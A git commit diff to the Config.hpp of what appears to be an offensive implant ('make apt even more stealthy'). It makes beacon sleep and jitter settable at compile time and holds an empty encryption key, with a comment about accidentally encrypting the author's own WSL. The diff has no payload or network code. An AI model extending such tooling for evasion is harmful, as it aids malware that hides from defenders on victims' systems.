ba49fcd30a3f7f125e7407012817333355620c8a
ENIX1701 <enix1701@gmail.com>
2026-03-13 21:24:55 +0100

    feat: make apt even more stealthy

--- include/core/Config.hpp
+++ include/core/Config.hpp
@@ -2,8 +2,17 @@
 #include <string>
 
 namespace Config {
+    #ifndef GHOST_SLEEP_SEC
     constexpr int DEFAULT_SLEEP_SEC = 5;
+    #else
+    constexpr int DEFAULT_SLEEP_SEC = GHOST_SLEEP_SEC;
+    #endif
+
+    #ifndef GHOST_JITTER_PERCENT
     constexpr int DEFAULT_JITTER_PERCENT = 10;
+    #else
+    constexpr int DEFAULT_JITTER_PERCENT = GHOST_JITTER_PERCENT;
+    #endif
 
     // add safeguard for now
     const std::string ENCRYPTION_KEY = ""; // yes i've accidentally encrypted my WSL
